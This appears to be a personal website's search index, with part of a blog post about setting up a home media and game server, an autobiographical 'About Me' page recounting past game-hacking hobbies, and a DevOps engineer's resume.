me to software RAID. Rather than spend money on a raid controller, RAID software and some operating systems offer a similar feature set. This is where things got messy. There was a lot to take in, a lot of material to read up on, and if I made the wrong choice there was a chance that I would have lost all my data switching to another RAID software. Here is a chart that helped me make my choice. In my opinion, ZFS is the best choice when it comes to data integrity and data redundancy. It is an amazing file system that makes real time snapshots and preserves data integrity. However, it is inflexible because it does not allow me to expand my array, and the amount of RAM it uses increases as more data is added for the real time snapshots. It also keeps all the drives spinning when anything is accessed, and is simply overkill for a home server with a focus on serving media files. For my needs, SnapRAID was the best choice due to the ability to add more drives, and its low resource consumption. I have a cron job set to run every day at 2AM to take a snapshot of my data. Also, I’ve been told many times and had it drilled into my head that RAID is not a backup. SnapRAID actually advertises itself as a backup program, which I found interesting. For pooling, I decided to go with the mhddfs file system instead of AUFS. ","date":"02-08-2015","objectID":"/posts/no-plex-zone/:4:0","tags":null,"title":"No Plex Zone","uri":"/posts/no-plex-zone/"},{"categories":null,"content":"Server Software After this wall of text and pictures, I still don’t have any purpose for my server. It simply has pooled storage now. The first thing I did was set up my game servers. Steam, Minecraft, and Terraria were simple enough to get running. The problem I ran into was how I had to keep opening instances of my SSH client (Putty) to run each server, and whenever I closed my windows, the connection will terminate and my server will end. Screen addresses these issues. Screen is a full-screen window manager that multiplexes a physical terminal between several processes, typically interactive shells. Pretty neat. It lets me create as many “windows” as possible and detach/reattach them as I see fit. Next comes Plex Media Server, which is the best media server I’ve used because it lets me stream content to my laptop or phone, and it lets me invite other Plex users to view my media. My original goal was to host a Plex server on my main PC to stream TV shows to my girlfriend when she was on her college campus since she didn’t have a TV and could not torrent on their network. I sidetracked a bit. The “No Plex Zone” name also came from a play on words with Plex Media server and the popular Rae Sremmurd - No Flex Zone song. ","date":"02-08-2015","objectID":"/posts/no-plex-zone/:5:0","tags":null,"title":"No Plex Zone","uri":"/posts/no-plex-zone/"},{"categories":null,"content":"Resource Management One important skill that I need to learn is how to manage system resources and react accordingly. Although there is no real load on my dedicated server, I thought it would be nice to familiarize myself with some tools in case some problems arise. Top: See if any processes are using an abnormal amount of CPU usage. Top also shows CPU usage in relation to how many cores the process, which is why some processes report over 100% usage. Nethogs: My network monitor to see if any of my processes is taking up an abnormal amount of bandwidth. Sensors: View temperature on all my components. Also lets me view and control my fan speeds. Webmin: Web interface for everything else. It’s cheating, but as a novice I find it helpful from time to time. I don’t rely on it much, and I plan to learn how to do everything via command line eventually. ","date":"02-08-2015","objectID":"/posts/no-plex-zone/:6:0","tags":null,"title":"No Plex Zone","uri":"/posts/no-plex-zone/"},{"categories":null,"content":"Future Plans Setting up this dedicated server was a learning experience. One of the career paths I’ve considered was being a sysadmin or a network engineer. Without formal education though, it was hard for me to enter the field. Having a box to play with taught me a lot of valuable skills. Later on in the future I wish to be comfortable enough to run servers in a business environment. Additionally, I want to learn more about security and vulnerabilities. ","date":"02-08-2015","objectID":"/posts/no-plex-zone/:6:1","tags":null,"title":"No Plex Zone","uri":"/posts/no-plex-zone/"},{"categories":null,"content":"Professional Throughout my career I’ve been a DevOps Engineer, Software Engineer, and Systems Administrator. I specialise in building cloud infrastructure with AWS, Kubernetes, SaltStack, and Terraform for startups and enterprise companies. Some of my primary responsibilities include: Info Building and maintaining infrastructure for startups and enterprise. Provision machines and deploy software. Ensure high availability for all core services. Multi-cloud disaster recovery procedure and documentation. Reproduce production environments locally for developers. Create CI/CD pipelines to automate developer workflow and deployment. E2E and unit testing for software and infrastructure. Automated vulnerability scanning and enforcement of security best practices. Adhering to compliance requirements such as HIPAA and NIST. Identity and Access Management. Monitoring and metrics evaluation. Incident handling. Cost management. Alongside that I’m also a Backend Engineer. I’m currently most proficient with Python and bash, and have previously worked on projects using: Languages and Frameworks Python Go TypeScript NodeJS Ruby Ruby on Rails ","date":"01-01-0001","objectID":"/about/:1:0","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"What Brought Me to Where I Am Today? When I was a kid, my parents rented my first console from BlockBuster. It was a Nintendo 64. Since then I’ve been enamored with video games and have served as both a source of entertainment and the foundation of my passion for programming. ","date":"01-01-0001","objectID":"/about/:2:0","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"Middle School - Programming Baby Steps Newgrounds - Flash and ActionScript Newgrounds was immensely popular when I was growing up. It was the first user generated content site I was exposed to and inspired me to learn ActionScript to submit my own game. I also invested time in learning Macromedia DreamWeaver to create my own website, though I would not succeed until much later. Grand Theft Auto: Vice City - SCM GTA:VC released on PC in 2002 after finishing the single-player campaign, I found a multiplayer mod called Multi Theft Auto: Vice City. There was no premise other than allowing players to gather in the massive open world. The community quickly started grouping up, forming alliances for gang fights, organised races, stunt performances, and joyriding. One day the fun was ruined by someone in a helicopter clipping through walls and instantly killing anyone they collided with. More people popped up both invincible and moving at impossible speeds. It was the first time I encountered cheats. One of the cheaters I spoke to introduced me to basic anti-cheat - bypassing CRC checks for trainers by hex editing. Soon afterwards, I learned how to program in SCM, GTA’s scripting language, to create my own mods and cheats. NeoPets - SWF Decompilation and Cheat Engine Following my exposure to Flash games from Newgrounds, through a SWF decompiler, Neopets taught me how games operated on a deeper level. After gaining a lower level understanding of how a game functioned, I moved on to learning Cheat Engine and made simple memory modifications to earn more Neopoints in several games. ","date":"01-01-0001","objectID":"/about/:2:1","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"High School - First Real Foray Into Game Hacking GunBound - Cheat Engine and OllyDbg GunBound came out during a time where people started coming together to form communities where people discussed and released different ways to hack the game. I participated in several forums and IRC channels, and started really making headway understanding how computers and desktop applications worked on a lower level. Using Cheat Engine and OllyDbg, I was able to debug the game to gain a deeper understanding of how it worked and produce cheats such as 1 hit ko, god mode, and infinite item usage. More advanced anti-cheat also meant simple hex editing would not suffice to make use of the tools I was accustomed to. I learned many ways to circumvent nProtect GameGuard, such as redirecting their servers to “update” from localhost through modifying the hosts file. Alongside that I learned more about web development and was able to write client side JavaScript to perform actions such as add gold to my account. MapleStory - Assembly Language, Botting, and Packet Editing MapleStory, being an MMORPG, introduced me to bots and more advanced methods of using Cheat Engine. I starting sharing more of my discoveries amongst the community after gaining a better understanding of Assembly Language (ASM) and writing my own bots starting with Visual Basic and AutoHotkey. I was also introduced to packet editing through Windows Packet Editor (WPE) and began to understand how information was passed through the internet. Even more advanced anti-cheat also meant I learned more ways it can be circumvented, such as replicating the memory for nProtect to read from whilst the real game memory was being modified through Cheat Engine. Counter-Strike 1.6 - Amx Mod X and C++ I absolutely loved this game. These were the good ‘ol days where the community would host their own servers instead of nowadays where we would play on company owned ones. This meant the modding community was thriving, and one of my favourite serves had a Pokemon mod, prompting me to learn AMX Mod X to develop plugins for my own dedicated server. I didn’t make anything notable but it was still a fun project. I also gained interest in the cheating scene for an FPS. There were primarily wallhacks and aimbots. The source code for one of the dominant cheats called OGC was released or leaked. This was when I learned the basics of C++ and OpenGL to write my first very basic cheat. Back to Web Development Being part of several communities, I also wanted to create one. I started off learning how forums operated through phpBB, vBulletin, and Invision Power Board. I purchased web hosting and learned how to host my own website and write PHP plugins to customise the (now defunct) sites I launched - MapleBound, CSBound, and CompactGaming. CSBound failed because I had no good releases to draw people in, however MapleBound and CompactGaming were successful due to me being able to release cheats for GunBound and MapleStory. My friends and I started a premium cheat subscription where subscribers will receive the latest private undetected hacks. We also didn’t want the software cracked so we invested time on how to obfuscate the binary. CompactGaming was an all purpose forum reaching 10,000 members at peak and was monetised through Google AdSense. ","date":"01-01-0001","objectID":"/about/:2:2","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"College and Afterwards My personal growth started shifting away from game hacking as a hobby to receiving a proper education in computer science and preparing myself for a career. Risk of Rain 2, Among Us, Phasmophobia, Fall Guys - C# Unity is a popular game framework, which is easily decompiled through dnSpy. Cheat Engine has also advanced to utilise Mono, which is the framework that powers scripting in Unity. Despite not knowing C# or spending time learning it, it was intuitive enough for me to pick up and write simple modifications to the game. OSCP OSCP is a penetration testing course and certification. While taking the course, I learned how to infiltrate networks, find vulnerabilities in software, write malicious payloads, and gain root access to machines. It is an excellent course and the knowledge gained is invaluable as someone who needs to be security minded for work. ","date":"01-01-0001","objectID":"/about/:2:3","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"General Option Description Languages Python, Golang, Ruby, TypeScript, Bash Technologies Kubernetes, Terraform, SaltStack, Chef, Docker, Jenkins, AWS, NodeJS, LDAP GitHub https://github.com/bycEEE Website https://bchoy.me Education Binghamton University, Computer Science ","date":"01-01-0001","objectID":"/resume/:1:0","tags":null,"title":"Resume","uri":"/resume/"},{"categories":null,"content":"Work Experience ","date":"01-01-0001","objectID":"/resume/:2:0","tags":null,"title":"Resume","uri":"/resume/"},{"categories":null,"content":"ComputerX - Platform Engineer/Consultant November 2022 - January 2023 | Los Angeles, California Assessed company needs and budget to successfully design and deploy the entire initial on-prem and cloud infrastructure from scratch. Introduced infrastructure as code to bootstrap AWS/CloudFlare accounts with best security practices in mind. Designed local development workflows and deployment cycle to ship code to EC2, ECS, Lambda, RabbitMQ, and on-prem infrastructure. Served as the lead Python developer for the core API, securely managing communication between cloud infrastructure and on-prem iOS devices. Working closely with iOS developers to tackle the challenge of remotely managing non-traditional devices, RabbitMQ was utilised for advanced routing to multiple data centers and safeguarded customer credentials with end-to-end TLS encryption, encryption at rest, token based authentication, and other security considerations. ","date":"01-01-0001","objectID":"/resume/:2:1","tags":null,"title":"Resume","uri":"/resume/"},{"categories":null,"content":"SnailBot - Software Engineer April 2022 - September 2022 | San Francisco, California (Remote) Served as the lead NodeJS/Typescript developer for a cloud based SaaS solution, successfully supporting tens of thousands of users in the automated purchase of high demand items such as graphics cards, video game consoles, and collectable trading cards. Pioneered the first cloud based SaaS offering for a specific major retailer, supporting features such as instantaneous product stock alerts, automatic checkout, authentication refreshing, improving account legitimacy score, and bot detection mitigations. Utilised Burp Suite, OWASP Amass, and other reconnaissance tools for tasks such as endpoint discovery, parameter automation/fuzzing, site update monitoring, request/response logging history, and discover methods to simulate human behaviour accurately. Demonstrated reverse engineering prowess to decipher obfuscated JavaScript, enabling the successful bypass of anti-bot technology from retailers using providers such as PerimeterX and F5 Solutions. Developed a suite of tools to automate requests to multiple endpoints, and designed monitors to alert on differences or unexpected behaviour to ensure the validity of existing bypass methods or to probe for new potential methods. Focused on lowering latency to the lowest amount possible to stay ahead of competing software and provide customers with the highest chance of obtaining their desired items. ","date":"01-01-0001","objectID":"/resume/:2:2","tags":null,"title":"Resume","uri":"/resume/"},{"categories":null,"content":"JW Player - DevOps Engineer March 2018 - April 2022 | New York, New York Leveraged my expertise in AWS, Kubernetes, Terraform, and SaltStack daily. Operated on the core Kubernetes administration team, managing several production clusters with hundreds of nodes each, with an uptime of 99.999%. Architected a robust Kubernetes cluster creation and management workflow with kops, helm, and Terraform. Developed additional internal tooling for cluster provisioning, and established a production grade environment with proper RBAC roles, multi-layered monitoring/alerting, tool-assisted resource/request limits, right sizing, autoscaling, secrets management, centralised logging, etc. Made significant contributions to our suite of microservices that handle our in-house deployment system. Developed software primarily in Python and Golang to allow our development teams to have autonomy and ownership of deploying their own applications to Kubernetes. This tool handled authentication flow, secrets retrieval without exposure, team based and individual permissioning, rollback and deployment history, configuration validation, etc. Automated a variety of tasks using Bash, Python and Golang, such as new hire onboarding, JIRA ticket creation from AWS maintenance notifications, and third-party platform integration based on LDAP attributes. Designed AWS VPC architecture across multiple accounts. Created and managed AWS VPC resources including subnets, route tables, security groups, network ACLS, and NAT gateways. Set up VPC peering across our accounts and multiple regions and configured VPC endpoints to privately access AWS services without exposure to public internet. Assisted in creating an internal Terraform module to perform subnet math that played nice with our existing legacy VPC structure. Improved a suboptimal Terraform module and introduced best practices such as versioned modules to overhaul a legacy Terraform repository that contained duplicated and unwieldy code. Led the initiative to move Terraform runs to CI/CD instead of local runs. Modernised an outdated Vault implementation and hardened the existing configuration to make better use of previously unused features including ACLs, properly expiring tokens/renewals, issuing dynamic credentials, certificate requests, and integration with Kubernetes and SaltStack. Participated on the SecOps team, kickstarting our bug bounty program in collaboration with HackerOne, developing our policy and refining our process. We also enhanced our security posture by employing trust architecture starting with Vault, implementing automated scanning tools for our repos and containers, established container security practices such as image scanning and runtime security, moving away from AWS secret keys to IAM Roles, etc. ","date":"01-01-0001","objectID":"/resume/:2:3","tags":null,"title":"Resume","uri":"/resume/"},{"categories":null,"content":"Opsline - DevOps Engineer/Consultant May 2016 - Oct 2017 | New York, New York Managed infrastructure using Chef and CloudFormation. Worked actively with 5+ clients to create custom solutions for their respective needs. Worked with a large array of software due to each client’s existing stacks including MongoDB, MySQL, Postgres, Cassandra, Chef, Node.js, Ruby on Rails, ELK, ActiveMQ, Redis, OpenVPN, Apache, Nginx, Nagios, etc. Greatly reduced build times and eliminated inconsistent deployments by optimising Jenkins and Travis pipelines. Improved security by performing routine IAM key audits, security group audits, repository scanning, Jenkins plugin vulnerability scanning, etc. Handled containerising and orchestration using Docker and ECS. ","date":"01-01-0001","objectID":"/resume/:2:4","tags":null,"title":"Resume","uri":"/resume/"},{"categories":null,"content":"The Barbarian Group - System Administrator August 2015 - April 2016 | New York, New York Converted an entirely manually managed infrastructure into infrastructure as code using instances provisioned by Packer and managed with Ansible. Re-architected the existing manually code deployment pipeline to true CICD using Jenkins. Streamlined local cross-platform development using Vagrant and Docker. Built internal tools using Ruby and bash to automate procedures such as backups and analytics parsing. ","date":"01-01-0001","objectID":"/resume/:2:5","tags":null,"title":"Resume","uri":"/resume/"}]